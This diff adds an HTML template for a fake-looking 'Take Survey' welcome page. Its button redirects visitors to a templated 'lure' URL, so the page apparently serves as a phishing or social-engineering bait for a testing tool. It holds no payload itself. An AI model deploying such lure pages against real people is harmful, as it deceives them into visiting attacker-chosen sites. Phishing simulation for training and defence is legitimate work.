@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>{survey_name} Survey</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        button {
+            font-size: 1.2em;
+            padding: 10px 20px;
+            color: white;
+            background-color: #007BFF;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <h1>Welcome to Our Website</h1>
+        <p>We would appreciate your feedback. Please take our survey:</p>
+        <button id="surveyButton" onclick="clickedSurvey()">Take Survey</button>
+    </div>
+
+    <script>
+        function clickedSurvey() {
+            window.location.assign({lure_url_js});
+        }
+    </script>
+</body>
+</html>
